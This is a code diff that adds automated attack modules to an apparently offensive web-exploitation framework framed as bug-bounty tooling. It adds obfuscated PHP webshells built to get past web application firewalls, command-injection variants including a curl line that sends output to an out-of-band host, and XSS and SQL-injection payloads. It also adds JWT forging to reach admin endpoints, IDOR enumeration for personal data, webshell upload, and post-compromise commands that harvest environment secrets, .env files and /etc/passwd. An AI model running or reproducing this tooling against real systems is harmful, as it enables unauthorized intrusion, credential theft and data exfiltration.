@@ -214,6 +214,7 @@ class TargetProfile:
     websocket_endpoints: List[str] = field(default_factory=list)
     ssti_params: List[str] = field(default_factory=list)
     smuggling_results: List[Dict] = field(default_factory=list)
+    chain_state: Dict[str, Any] = field(default_factory=dict)
 
 @dataclass
 class Config:
@@ -13907,6 +13908,729 @@ class FullChainReportGen:
         return profile
 
 # ══════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
+# TOOLS 361-365 — Phase 16: Contextual State + WAF Bypass + Post-Exploit
+# Fixes: (1) Hit-and-Run RCE  (2) No contextual multi-stage state
+#        (3) Signatured / WAF-blocked payloads
+# ══════════════════════════════════════════════════════════════
+
+class WAFBypassPayloadGen:
+    """Utility: generate WAF-bypassing obfuscated payload variants for any attack class.
+    Used by Phase 16 tools — not a Phase tool itself (no run() method)."""
+
+    @staticmethod
+    def php_webshells() -> List[Tuple[str, str, bytes, str]]:
+        """(filename, content_type, body, description) — 10 WAF-bypass PHP shell variants."""
+        return [
+            ("shell.php",      "application/octet-stream",
+             b"<?php $f='sys'.'tem';$f($_GET[0]); ?>",
+             "string concat bypass"),
+            ("shell.php%00.jpg", "image/jpeg",
+             b"<?php eval(base64_decode('c3lzdGVtKCRfR0VUWzBdKTs=')); ?>",
+             "null-byte extension bypass"),
+            ("shell.phtml",    "image/png",
+             b"<?php call_user_func('passthru',$_GET[0]); ?>",
+             ".phtml extension"),
+            ("shell.php5",     "image/gif",
+             b"GIF89a<?php passthru($_GET[0]); ?>",
+             "GIF polyglot + .php5"),
+            ("shell.pHp",      "image/jpeg",
+             b"<?php assert($_GET[0]); ?>",
+             "case-mixed extension"),
+            ("shell.php.jpg",  "image/jpeg",
+             b"\xff\xd8\xff<?php system($_GET[0]); ?>",
+             "double-ext JPEG magic"),
+            ("shell.php;.jpg", "image/jpeg",
+             b"<?php system($_GET[0]); ?>",
+             "semicolon truncation"),
+            (".htaccess",      "text/plain",
+             b"AddType application/x-httpd-php .jpg\n",
+             ".htaccess MIME override"),
+            ("shell.svg",      "image/svg+xml",
+             b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>',
+             "SVG XSS"),
+            ("shell.php.",     "image/png",
+             b"<?php $x=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$x($_GET[0]); ?>",
+             "trailing-dot + chr() obfuscation"),
+        ]
+
+    @staticmethod
+    def cmdi_variants(cmd: str = "id") -> List[Tuple[str, str]]:
+        """(technique_name, payload) — 15 CMDi WAF-bypass variants."""
+        enc = urllib.parse.quote
+        hex_c = "".join(f"\\x{b:02x}" for b in cmd.encode())
+        return [
+            ("standard",       cmd),
+            ("semicolon",      f";{cmd}"),
+            ("pipe",           f"|{cmd}"),
+            ("subshell",       f"$({cmd})"),
+            ("backtick",       f"`{cmd}`"),
+            ("newline",        f"\n{cmd}"),
+            ("IFS_sep",        f";$IFS'{cmd}'"),
+            ("quote_insert",   cmd[:1] + "''" + cmd[1:]),
+            ("brace_exp",      f";{{{cmd}}}"),
+            ("abs_path",       f";/bin/sh -c '{cmd}'"),
+            ("hex_chars",      f";$(printf '{hex_c}')"),
+            ("env_path",       f";env$IFS PATH=/bin:$PATH$IFS {cmd}"),
+            ("null_term",      f";{cmd}%00"),
+            ("comment_trail",  f";{cmd} #"),
+            ("oob_b64",        f";curl${{IFS}}http://__OOB__/?x=$(${{{cmd}}}|base64)"),
+        ]
+
+    @staticmethod
+    def xss_bypasses() -> List[str]:
+        return [
+            "<ScRiPt>alert(document.domain)</ScRiPt>",
+            "<svg onload=alert(document.domain)>",
+            "<details open ontoggle=alert(document.domain)>",
+            '"><img src=x onerror=alert(document.domain)>',
+            "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>",
+            "javascript:alert(document.domain)",
+            "<math><maction actiontype=\"statusline#\"><mtext>JS</mtext>"
+            "<mtext>alert(document.domain)</mtext></maction></math>",
+            "<iframe srcdoc='<script>alert(parent.document.domain)</script>'>",
+            '"-alert(document.domain)-"',
+            "<input autofocus onfocus=alert(document.domain)>",
+        ]
+
+    @staticmethod
+    def sqli_bypasses(base: str = "' OR '1'='1") -> List[str]:
+        return [
+            base,
+            base.replace(" ", "/**/"),
+            base.replace(" ", "\t"),
+            base.replace("OR", "||"),
+            "' /*!50000OR*/ '1'='1",
+            "' OR 0x31=0x31--",
+            "1' AND SLEEP(5)--",
+            "1' AND 1=1--",
+            "1' AND 1=2--",
+            "') OR ('1'='1",
+            '\" OR \"1\"=\"1',
+            "1;SELECT SLEEP(5)--",
+            "' UNION SELECT NULL,NULL,NULL--",
+            "1' ORDER BY 1--",
+            "1' ORDER BY 99--",
+        ]
+
+
+class AuthContextHarvester:
+    """Register + login a test account; store session/JWT in chain_state for
+    all subsequent authenticated tests (IDOR, BFLA, privilege escalation)."""
+    NAME = "Auth Context Harvester"
+    TEST_USER  = "apextest_bugbounty"
+    TEST_PASS  = "Apex@Hunt3r!BugBounty2024"
+    TEST_EMAIL = "apextest@bugbounty-research.invalid"
+
+    REGISTER_PATHS = [
+        "/register", "/signup", "/api/register", "/api/signup",
+        "/api/v1/register", "/api/v1/signup", "/auth/register",
+        "/user/register", "/users/register", "/account/register",
+        "/api/auth/register", "/api/users/create",
+    ]
+    LOGIN_PATHS = [
+        "/login", "/signin", "/api/login", "/api/signin",
+        "/api/v1/login", "/api/v1/auth", "/auth/login",
+        "/user/login", "/users/login", "/account/login",
+        "/api/auth/login", "/api/users/login", "/api/session",
+    ]
+
+    def _post(self, url: str, bodies: List[bytes], ctypes: List[str], cfg: Config):
+        for body, ct in zip(bodies, ctypes):
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout, "POST", body,
+                           {"Content-Type": ct})
+                if r.status in (200, 201):
+                    return r
+            except Exception:
+                pass
+        return None
+
+    def _login_bodies(self) -> Tuple[List[bytes], List[str]]:
+        jt = "application/json"
+        ft = "application/x-www-form-urlencoded"
+        u, p, e = self.TEST_USER, self.TEST_PASS, urllib.parse.quote(self.TEST_EMAIL)
+        return [
+            json.dumps({"username": u, "password": p}).encode(),
+            json.dumps({"email": self.TEST_EMAIL, "password": p}).encode(),
+            json.dumps({"user": u, "pass": p}).encode(),
+            f"username={u}&password={p}".encode(),
+            f"email={e}&password={p}".encode(),
+        ], [jt, jt, jt, ft, ft]
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        if profile.chain_state.get("auth_session") or profile.chain_state.get("auth_jwt"):
+            return profile  # already harvested
+        base = profile.url.rstrip("/")
+        jt = "application/json"
+        ft = "application/x-www-form-urlencoded"
+        u, p = self.TEST_USER, self.TEST_PASS
+        e = self.TEST_EMAIL
+
+        # 1 — Try registration
+        reg_bodies = [
+            json.dumps({"username": u, "password": p, "email": e}).encode(),
+            json.dumps({"user": u, "pass": p, "email": e}).encode(),
+            json.dumps({"name": u, "password": p, "email": e}).encode(),
+            f"username={u}&password={p}&email={urllib.parse.quote(e)}".encode(),
+        ]
+        for path in self.REGISTER_PATHS:
+            r = self._post(base + path, reg_bodies, [jt, jt, jt, ft], cfg)
+            if r:
+                info(f"  Registered test account via {path}")
+                profile.chain_state["register_path"] = path
+                break
+
+        # 2 — Try login & harvest session/JWT
+        bodies, ctypes = self._login_bodies()
+        for path in self.LOGIN_PATHS:
+            r = self._post(base + path, bodies, ctypes, cfg)
+            if not r:
+                continue
+            body_str = (r.body or b"").decode("utf-8", errors="replace")
+            jwt_m = re.search(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', body_str)
+            cookie = r.headers.get("set-cookie", "")
+            if jwt_m or cookie:
+                if jwt_m:
+                    profile.chain_state["auth_jwt"] = jwt_m.group(0)
+                    ok(f"  Auth JWT captured: {jwt_m.group(0)[:40]}...")
+                if cookie:
+                    profile.chain_state["auth_session"] = cookie.split(";")[0]
+                    ok(f"  Auth cookie captured: {cookie[:60]}...")
+                profile.chain_state["auth_login_path"] = path
+                # Try to extract user ID from response
+                uid_m = re.search(r'"(?:id|user_id|userId|uid)":\s*(\d+)', body_str)
+                if uid_m:
+                    profile.chain_state["auth_user_id"] = uid_m.group(1)
+                profile.findings.append(Finding(
+                    id="P16-AUTH-CONTEXT-001",
+                    title=f"Test Auth Context Acquired — {path}",
+                    severity="INFO", cvss=0.0, cwe="CWE-284",
+                    description=(
+                        f"Test account registered and authenticated at {path}. "
+                        "Session/JWT harvested — will be used for authenticated IDOR, "
+                        "BFLA, and privilege-escalation tests in subsequent chains."
+                    ),
+                    evidence=(
+                        f"JWT={'yes (' + profile.chain_state.get('auth_jwt','')[:20] + '...)' if jwt_m else 'no'} | "
+                        f"Cookie={'yes' if cookie else 'no'} | "
+                        f"UserID={profile.chain_state.get('auth_user_id','unknown')}"
+                    ),
+                    poc_curl=(
+                        f"curl -sk -X POST '{base + path}' "
+                        f"-H 'Content-Type: application/json' "
+                        f"-d '{{\"username\":\"{u}\",\"password\":\"{p}\"}}'"
+                    ),
+                    category="Authentication",
+                    remediation="Rate-limit registration. Validate email ownership. Remove test accounts."
+                ))
+                break
+        return profile
+
+
+class ContextualMultiStageChain:
+    """Dynamic multi-stage exploit chain that reads discoveries from chain_state
+    and previous findings to chain attacks: JWT crack→forge admin token→admin endpoints,
+    IDOR→enumerate IDs with auth context, SQLi→extract DB metadata."""
+    NAME = "Contextual Multi-Stage Chain"
+
+    def _build_auth_headers(self, chain_state: Dict) -> Dict:
+        if chain_state.get("forged_admin_jwt"):
+            return {"Authorization": f"Bearer {chain_state['forged_admin_jwt']}"}
+        if chain_state.get("auth_jwt"):
+            return {"Authorization": f"Bearer {chain_state['auth_jwt']}"}
+        if chain_state.get("auth_session"):
+            return {"Cookie": chain_state["auth_session"]}
+        return {}
+
+    def _forge_admin_jwt(self, jwt_str: str, secret: str) -> str:
+        import base64, hmac as _hmac, hashlib
+        try:
+            parts = jwt_str.split(".")
+            if len(parts) != 3:
+                return ""
+            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
+            for k in ["role", "roles", "type", "userType", "user_type"]:
+                if k in payload:
+                    payload[k] = "admin"
+            for k in ["isAdmin", "is_admin", "admin"]:
+                if k in payload:
+                    payload[k] = True
+            new_p = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b"=").decode()
+            sig_input = f"{parts[0]}.{new_p}".encode()
+            sig = _hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
+            return f"{parts[0]}.{new_p}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
+        except Exception:
+            return ""
+
+    def _stage_jwt_forge(self, profile: TargetProfile, cfg: Config) -> None:
+        """Stage 1: if JWT secret cracked → forge admin token → probe admin endpoints."""
+        secret = profile.chain_state.get("cracked_jwt_secret")
+        if not secret:
+            for f in profile.findings:
+                if "JWT-CRACK" in f.id:
+                    m = re.search(r"Secret: '([^']+)'", f.evidence)
+                    if m:
+                        secret = m.group(1)
+                        profile.chain_state["cracked_jwt_secret"] = secret
+                        break
+        jwt = profile.chain_state.get("auth_jwt", "")
+        if not secret or not jwt:
+            return
+        forged = self._forge_admin_jwt(jwt, secret)
+        if not forged:
+            return
+        profile.chain_state["forged_admin_jwt"] = forged
+        base = profile.url.rstrip("/")
+        admin_paths = [
+            "/api/admin", "/api/admin/users", "/api/v1/admin",
+            "/api/dashboard", "/admin/api", "/api/users?role=admin",
+            "/api/settings", "/api/config", "/api/admin/config",
+        ]
+        for path in admin_paths:
+            try:
+                r = _fetch(base + path, cfg.ua, cfg.timeout,
+                           extra_headers={"Authorization": f"Bearer {forged}"})
+                if r.status == 200:
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    if any(k in body for k in ['"email"', '"password"', '"role"', '"users"', '"secret"']):
+                        profile.findings.append(Finding(
+                            id=f"P16-JWT-FORGE-ADMIN-{path.replace('/','_')[:18]}",
+                            title=f"Forged Admin JWT — Unauthorized Access: {path}",
+                            severity="CRITICAL", cvss=9.8, cwe="CWE-287",
+                            description=(
+                                f"Cracked JWT secret '{secret}' used to re-sign token with role=admin. "
+                                f"Forged token granted access to {path}. Admin data returned."
+                            ),
+                            evidence=body[:400],
+                            poc_curl=(
+                                f"# Forge token with cracked secret:\n"
+                                f"python3 -c \"import jwt; print(jwt.encode({{'sub':'1','role':'admin','isAdmin':True}}"
+                                f",'{secret}',algorithm='HS256'))\"\n"
+                                f"# Use forged token:\n"
+                                f"curl -sk '{base + path}' -H 'Authorization: Bearer <FORGED>'"
+                            ),
+                            category="JWT / Auth Bypass",
+                            remediation="Replace JWT secret with ≥256-bit random value. Use RS256. Invalidate all existing tokens."
+                        ))
+                        profile.chain_state["admin_access_path"] = path
+                        ok(f"  Forged JWT → admin access at {path}")
+            except Exception:
+                pass
+
+    def _stage_auth_idor(self, profile: TargetProfile, cfg: Config) -> None:
+        """Stage 2: use authenticated context to enumerate object IDs across endpoints."""
+        auth_h = self._build_auth_headers(profile.chain_state)
+        if not auth_h:
+            return
+        base = profile.url.rstrip("/")
+        my_id = profile.chain_state.get("auth_user_id", "1")
+        for ep in profile.api_endpoints[:8]:
+            for victim_id in [str(i) for i in range(1, 6) if str(i) != my_id]:
+                for url_pattern in [f"{base}{ep}/{victim_id}",
+                                    f"{base}{ep}?id={victim_id}",
+                                    f"{base}{ep}?user_id={victim_id}"]:
+                    try:
+                        r = _fetch(url_pattern, cfg.ua, cfg.timeout, extra_headers=auth_h)
+                        if r.status == 200:
+                            body = (r.body or b"").decode("utf-8", errors="replace")
+                            pii_keys = ['"email"', '"phone"', '"password"', '"ssn"', '"address"', '"credit"']
+                            if any(k in body for k in pii_keys):
+                                profile.findings.append(Finding(
+                                    id=f"P16-IDOR-AUTH-{ep.replace('/','')[:12]}-{victim_id}",
+                                    title=f"Authenticated IDOR — {ep} ID={victim_id} exposes PII",
+                                    severity="HIGH", cvss=8.1, cwe="CWE-639",
+                                    description=(
+                                        f"Authenticated as user {my_id}, accessed {url_pattern} "
+                                        f"(belongs to user {victim_id}). PII fields returned. "
+                                        "No server-side ownership enforcement."
+                                    ),
+                                    evidence=body[:300],
+                                    poc_curl=(
+                                        "curl -sk '{}' -H '{}'"
+                                        .format(
+                                            url_pattern,
+                                            "Authorization: Bearer " + profile.chain_state.get("auth_jwt", "TOKEN")
+                                            if auth_h.get("Authorization") else
+                                            "Cookie: " + profile.chain_state.get("auth_session", "SESSION")
+                                        )
+                                    ),
+                                    category="IDOR",
+                                    remediation="Enforce ownership checks server-side on every object access."
+                                ))
+                                break
+                    except Exception:
+                        pass
+
+    def _stage_sqli_extract(self, profile: TargetProfile, cfg: Config) -> None:
+        """Stage 3: on confirmed SQLi, extract DB version/user/name via UNION."""
+        sqli_f = [f for f in profile.findings if "SQL" in f.id and f.severity in ("CRITICAL","HIGH")]
+        if not sqli_f:
+            return
+        for f in sqli_f[:2]:
+            url_m = re.search(r"https?://[^\s'\"&>]+", f.poc_curl)
+            if not url_m:
+                continue
+            base_url = url_m.group(0).split("?")[0]
+            param_m  = re.search(r"[?&](\w+)=([^&\s'\"]*)", url_m.group(0))
+            if not param_m:
+                continue
+            param = param_m.group(1)
+            for func, label in [("version()", "DB_VERSION"), ("current_user()", "DB_USER"),
+                                 ("database()", "DB_NAME"), ("@@hostname", "DB_HOST")]:
+                test_url = f"{base_url}?{param}=1' UNION SELECT {func},NULL,NULL-- -"
+                try:
+                    r = _fetch(test_url, cfg.ua, cfg.timeout)
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    m = re.search(
+                        r"((?:8|5)\.\d+\.\d+[\w.-]*|mariadb[^\s<\"']{0,30}"
+                        r"|root@[^\s<\"']{0,30}|information_schema|[a-z_]{3,20}_db)", body, re.I)
+                    if m:
+                        val = m.group(1)
+                        profile.chain_state[label] = val
+                        profile.findings.append(Finding(
+                            id=f"P16-SQLI-EXTRACT-{label}",
+                            title=f"SQLi Data Extraction — {label}: {val[:40]}",
+                            severity="CRITICAL", cvss=9.8, cwe="CWE-89",
+                            description=(
+                                f"UNION-based SQL injection extraction confirmed. "
+                                f"{label} = {val}. Database identity exposed — "
+                                "attacker can enumerate all tables and exfiltrate data."
+                            ),
+                            evidence=f"{label} = {val}",
+                            poc_curl=f"curl -sk '{test_url}'",
+                            category="SQL Injection",
+                            remediation="Use parameterized queries. Restrict DB user to minimum privileges."
+                        ))
+                        ok(f"  SQLi extract {label}: {val}")
+                except Exception:
+                    pass
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        self._stage_jwt_forge(profile, cfg)
+        self._stage_auth_idor(profile, cfg)
+        self._stage_sqli_extract(profile, cfg)
+        return profile
+
+
+class WAFBypassUploadChain:
+    """File upload tester using obfuscated WAF-bypass payloads + MIME confusion.
+    Uses auth context from chain_state when available."""
+    NAME = "WAF Bypass Upload Chain"
+    UPLOAD_PATHS = [
+        "/upload", "/api/upload", "/file/upload", "/files/upload",
+        "/admin/upload", "/api/files", "/api/v1/upload", "/media/upload",
+        "/images/upload", "/attachments/upload", "/profile/avatar",
+        "/api/avatar", "/api/profile/image", "/api/v1/files",
+    ]
+
+    def _multipart(self, fname: str, ctype: str, body: bytes) -> Tuple[bytes, str]:
+        boundary = "----ApexHunterBoundary7MA4YWxkTr"
+        data = (
+            f"--{boundary}\r\n"
+            f"Content-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\n"
+            f"Content-Type: {ctype}\r\n\r\n"
+        ).encode() + body + f"\r\n--{boundary}--\r\n".encode()
+        return data, f"multipart/form-data; boundary={boundary}"
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        auth_h: Dict = {}
+        if profile.chain_state.get("auth_jwt"):
+            auth_h = {"Authorization": f"Bearer {profile.chain_state['auth_jwt']}"}
+        elif profile.chain_state.get("auth_session"):
+            auth_h = {"Cookie": profile.chain_state["auth_session"]}
+
+        variants = WAFBypassPayloadGen.php_webshells()
+
+        for up_path in self.UPLOAD_PATHS:
+            url = base + up_path
+            probe = _fetch(url, cfg.ua, cfg.timeout, extra_headers=auth_h)
+            if probe.status not in (200, 302, 405, 400, 401, 403):
+                continue  # endpoint doesn't exist
+
+            for fname, ctype, body, desc in variants:
+                mp_body, mp_ct = self._multipart(fname, ctype, body)
+                hdrs = {"Content-Type": mp_ct}
+                hdrs.update(auth_h)
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", mp_body, hdrs)
+                    resp = (r.body or b"").decode("utf-8", errors="replace")
+                    base_fname = fname.split(".")[0]
+                    if r.status in (200, 201) and any(
+                        s in resp.lower() for s in ["success", "upload", "url", "path", "file", base_fname]
+                    ):
+                        url_m = re.search(r'(?:url|path|file|href|src)["\s:=]+["\']?(/[^\s"\'<>]{3,80})', resp)
+                        shell_url = (base + url_m.group(1)) if url_m else f"{url}/{fname}"
+                        profile.chain_state["shell_url"]   = shell_url
+                        profile.chain_state["shell_param"] = "0"
+                        profile.findings.append(Finding(
+                            id=f"P16-UPLOAD-BYPASS-{desc.replace(' ','_').upper()[:20]}",
+                            title=f"WAF-Bypass Shell Upload — {desc} ({fname})",
+                            severity="CRITICAL", cvss=9.8, cwe="CWE-434",
+                            description=(
+                                f"PHP webshell '{fname}' uploaded via '{desc}' technique at {up_path}. "
+                                f"Classic signature bypassed. Possible RCE: {shell_url}?0=id"
+                            ),
+                            evidence=f"HTTP {r.status} | {resp[:200]}",
+                            poc_curl=(
+                                f"# Upload (bypass={desc}):\n"
+                                f"curl -sk -X POST '{url}' -F 'file=@shell;filename={fname};type={ctype}'\n"
+                                f"# Execute: curl '{shell_url}?0=id'"
+                            ),
+                            category="File Upload / RCE",
+                            remediation=(
+                                "Validate by magic bytes, not extension or Content-Type. "
+                                "Store uploads outside webroot. Disable PHP in upload dirs."
+                            )
+                        ))
+                        break  # one success per endpoint is enough
+                except Exception:
+                    pass
+        return profile
+
+
+class PostRCEImpactMapper:
+    """After RCE/CMDi is confirmed in any finding, execute a safe enumeration
+    command chain via the confirmed vector to document full blast radius."""
+    NAME = "Post-RCE Impact Mapper"
+
+    ENUM_CMDS = [
+        ("id",                        "uid_context"),
+        ("whoami",                    "username"),
+        ("hostname",                  "hostname"),
+        ("uname -a",                  "kernel"),
+        ("cat /etc/os-release 2>/dev/null || cat /etc/issue", "os_distro"),
+        ("ip addr 2>/dev/null || hostname -I 2>/dev/null",    "network"),
+        ("cat /etc/passwd | head -5",                         "system_users"),
+        ("env | grep -iE 'key|secret|token|pass|db|api|aws|azure|gcp' 2>/dev/null",
+                                      "sensitive_env_vars"),
+        ("find /var/www /app /srv -name '*.env' -o -name '.env' 2>/dev/null | head -8",
+                                      "env_files"),
+        ("find / -perm -4000 -type f 2>/dev/null | head -8",  "suid_binaries"),
+        ("ls /root 2>/dev/null",      "root_dir"),
+        ("crontab -l 2>/dev/null; ls /etc/cron.d 2>/dev/null", "cron_jobs"),
+        ("cat /proc/version",         "kernel_build"),
+        ("ps aux 2>/dev/null | head -8", "running_procs"),
+    ]
+
+    def _exec(self, rce_url: str, param: str, cmd: str, ua: str, timeout: int) -> str:
+        url = f"{rce_url}?{param}={urllib.parse.quote(cmd)}"
+        try:
+            r = _fetch(url, ua, timeout)
+            out = re.sub(r'<[^>]+>', '', (r.body or b"").decode("utf-8", errors="replace")).strip()
+            return out[:400]
+        except Exception:
+            return ""
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        rce_url   = profile.chain_state.get("shell_url") or profile.chain_state.get("rce_url")
+        rce_param = profile.chain_state.get("shell_param") or profile.chain_state.get("rce_param", "0")
+
+        if not rce_url:
+            # Search findings for confirmed RCE PoC URL
+            for f in profile.findings:
+                if f.severity == "CRITICAL" and any(k in f.id for k in ["RCE","UPLOAD","CMDI","SHELL"]):
+                    m = re.search(r"(https?://[^\s'\"]+)\?(\w+)=", f.poc_curl)
+                    if m:
+                        rce_url, rce_param = m.group(1), m.group(2)
+                        profile.chain_state["rce_url"]   = rce_url
+                        profile.chain_state["rce_param"] = rce_param
+                        break
+
+        if not rce_url:
+            return profile
+
+        banner(f"Post-RCE Enumeration — {rce_url}")
+        results: Dict[str, str] = {}
+        for cmd, label in self.ENUM_CMDS:
+            out = self._exec(rce_url, rce_param, cmd, cfg.ua, cfg.timeout)
+            if out and len(out) > 2:
+                results[label] = out
+                ok(f"  [{label}] {out[:80]}")
+
+        if not results:
+            return profile
+
+        # Determine true blast radius
+        impact_flags = []
+        uid = results.get("uid_context", "")
+        if re.search(r"uid=0\(root\)", uid):
+            impact_flags.append("ROOT SHELL confirmed")
+        if results.get("sensitive_env_vars"):
+            impact_flags.append("Env secrets leaked")
+        if results.get("env_files"):
+            impact_flags.append(".env files accessible")
+        if results.get("root_dir"):
+            impact_flags.append("/root readable")
+        if results.get("suid_binaries"):
+            impact_flags.append("SUID privesc candidates present")
+
+        report_lines = ["POST-RCE ENUMERATION — IMPACT ASSESSMENT", ""]
+        for lbl, val in results.items():
+            report_lines.append(f"  [{lbl.upper()}]")
+            for line in val.splitlines()[:5]:
+                report_lines.append(f"    {line}")
+            report_lines.append("")
+
+        profile.findings.append(Finding(
+            id="P16-POST-RCE-IMPACT-001",
+            title=f"Post-RCE Impact Map — {' | '.join(impact_flags) or 'Full server compromise'}",
+            severity="CRITICAL", cvss=10.0, cwe="CWE-78",
+            description=(
+                "Full post-RCE enumeration completed. Server compromise impact documented:\n\n"
+                + "\n".join(report_lines)
+            ),
+            evidence="\n".join(f"{k}: {v[:120]}" for k, v in list(results.items())[:6]),
+            poc_curl=(
+                f"# Execute arbitrary commands via confirmed RCE:\n"
+                f"curl -sk '{rce_url}?{rce_param}=COMMAND'\n\n"
+                f"# Key findings:\n"
+                + "\n".join(f"# {f}: {v[:80]}" for f, v in list(results.items())[:4])
+            ),
+            category="RCE / Post-Exploitation",
+            remediation=(
+                "CRITICAL — Active server compromise. Immediately: "
+                "(1) Patch RCE vector, (2) Rotate all credentials in env/configs, "
+                "(3) Review auth logs for prior access, (4) Conduct full forensic audit."
+            )
+        ))
+        for flag in impact_flags:
+            high(f"  Post-exploit: {flag}")
+        return profile
+
+
+class DynamicWAFBypassAdapter:
+    """Detect active WAF and auto-select working CMDi/XSS/SQLi bypass variant.
+    Re-tests known-blocked findings with 15 obfuscation techniques."""
+    NAME = "Dynamic WAF Bypass Adapter"
+
+    def _is_blocked(self, r) -> bool:
+        if r.status in (403, 406, 419, 429, 501):
+            return True
+        body = (r.body or b"").decode("utf-8", errors="replace").lower()
+        return any(s in body for s in [
+            "access denied", "blocked by", "security policy",
+            "web application firewall", "mod_security", "not acceptable",
+            "request rejected", "illegal request"
+        ])
+
+    def _try_cmdi(self, base_url: str, param: str, cfg: Config) -> Optional[Tuple[str, str]]:
+        for name, payload in WAFBypassPayloadGen.cmdi_variants("id"):
+            if "__OOB__" in payload:
+                continue  # skip OOB-only payloads
+            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
+            try:
+                r = _fetch(test_url, cfg.ua, cfg.timeout)
+                if self._is_blocked(r):
+                    continue
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                if re.search(r"uid=\d+\([a-z]+\)|root|www-data|daemon|nobody", body):
+                    return name, payload
+            except Exception:
+                pass
+        return None
+
+    def _try_xss(self, base_url: str, param: str, cfg: Config) -> Optional[str]:
+        for payload in WAFBypassPayloadGen.xss_bypasses():
+            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
+            try:
+                r = _fetch(test_url, cfg.ua, cfg.timeout)
+                if self._is_blocked(r):
+                    continue
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                if "alert(document.domain)" in body or html.unescape(payload) in body:
+                    return payload
+            except Exception:
+                pass
+        return None
+
+    def _try_sqli(self, base_url: str, param: str, cfg: Config) -> Optional[str]:
+        for payload in WAFBypassPayloadGen.sqli_bypasses():
+            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
+            try:
+                r = _fetch(test_url, cfg.ua, cfg.timeout)
+                if self._is_blocked(r):
+                    continue
+                body = (r.body or b"").decode("utf-8", errors="replace")
+                if re.search(r"(sql syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|"
+                             r"Microsoft.*ODBC.*Driver|SQLITE_ERROR|syntax error)", body, re.I):
+                    return payload
+            except Exception:
+                pass
+        return None
+
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        base = profile.url.rstrip("/")
+        waf = ", ".join(profile.waf) or "unknown"
+
+        # Re-test CMDi findings with bypass variants
+        cmdi_f = [f for f in profile.findings if "CMDI" in f.id or "CMDi" in f.id]
+        for f in cmdi_f[:3]:
+            m = re.search(r"https?://([^\s'\"?]+)\?(\w+)=", f.poc_curl)
+            if not m:
+                continue
+            result = self._try_cmdi(f"https://{m.group(1)}", m.group(2), cfg)
+            if result:
+                name, payload = result
+                profile.chain_state["rce_url"]   = f"https://{m.group(1)}"
+                profile.chain_state["rce_param"]  = m.group(2)
+                profile.findings.append(Finding(
+                    id=f"P16-WAFBYPASS-CMDI-{name.upper()[:18]}",
+                    title=f"WAF-Bypass CMDi — '{name}' technique confirmed ({waf})",
+                    severity="CRITICAL", cvss=9.8, cwe="CWE-78",
+                    description=(
+                        f"WAF ({waf}) bypassed for command injection using '{name}' obfuscation. "
+                        f"Payload: {payload[:100]}. RCE confirmed despite WAF protection."
+                    ),
+                    evidence=f"technique={name} | payload={payload[:80]}",
+                    poc_curl=f"curl -sk '{profile.chain_state['rce_url']}?{m.group(2)}={urllib.parse.quote(payload)}'",
+                    category="WAF Bypass / RCE",
+                    remediation="WAF bypass confirmed — validate input at application layer, not only at WAF."
+                ))
+
+        # Re-test XSS on discovered parameters
+        for param in profile.parameters[:6]:
+            payload = self._try_xss(base, param, cfg)
+            if payload:
+                profile.findings.append(Finding(
+                    id=f"P16-WAFBYPASS-XSS-{param[:15]}",
+                    title=f"WAF-Bypass XSS — parameter '{param}'",
+                    severity="HIGH", cvss=7.4, cwe="CWE-79",
+                    description=(
+                        f"XSS reflected in '{param}' despite WAF ({waf}). "
+                        f"Working bypass payload: {payload[:80]}"
+                    ),
+                    evidence=f"param={param} | payload={payload[:80]}",
+                    poc_curl=f"curl -sk '{base}?{param}={urllib.parse.quote(payload)}'",
+                    category="WAF Bypass / XSS",
+                    remediation="Encode output server-side. Implement strict CSP. WAF alone is insufficient."
+                ))
+                break
+
+        # Re-test SQLi on discovered parameters
+        for param in profile.parameters[:6]:
+            payload = self._try_sqli(base, param, cfg)
+            if payload:
+                profile.findings.append(Finding(
+                    id=f"P16-WAFBYPASS-SQLI-{param[:15]}",
+                    title=f"WAF-Bypass SQLi — parameter '{param}'",
+                    severity="CRITICAL", cvss=9.8, cwe="CWE-89",
+                    description=(
+                        f"SQL injection error triggered in '{param}' despite WAF ({waf}). "
+                        f"Working bypass payload: {payload[:80]}"
+                    ),
+                    evidence=f"param={param} | payload={payload[:80]}",
+                    poc_curl=f"curl -sk '{base}?{param}={urllib.parse.quote(payload)}'",
+                    category="WAF Bypass / SQLi",
+                    remediation="Use parameterized queries. WAF bypass confirmed — fix at code level."
+                ))
+                break
+
+        return profile
+
+
+# ══════════════════════════════════════════════════════════════
 # AI ANALYZER — Claude claude-opus-4-8 powered finding analysis
 # ══════════════════════════════════════════════════════════════
 class AIAnalyzer:
@@ -14267,6 +14991,7 @@ class APEXOrchestrator:
